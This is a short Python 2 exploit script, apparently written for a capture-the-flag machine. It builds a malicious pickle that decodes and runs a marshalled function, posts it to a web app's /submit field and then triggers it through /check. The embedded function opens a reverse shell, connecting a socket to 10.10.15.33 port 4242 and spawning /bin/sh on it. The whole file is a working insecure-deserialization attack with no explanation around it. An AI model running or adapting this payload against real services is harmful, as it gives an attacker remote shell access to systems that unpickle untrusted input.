import requests
import sys
from hashlib import md5
import cPickle
import subprocess
import os

import marshal
import base64

def foo():
    import socket,subprocess,os;
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("10.10.15.33",4242));
    os.dup2(s.fileno(),0); 
    os.dup2(s.fileno(),1); 
    os.dup2(s.fileno(),2);\
    p=subprocess.call(["/bin/sh","-i"]);

junk= """ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))

URL = "http://10.10.10.70/submit"
charac = junk+"Bartp1"
quote = "Eat my shorts"
PRAMS = {"character":charac, "quote":quote}
r = requests.post(url = URL, data = PRAMS)

URL2 = "http://10.10.10.70/check"
id = md5(charac+quote).hexdigest()
DATA2 = {"id":id}
r2 = requests.post(url = URL2, data = DATA2)
print(r2.content) 
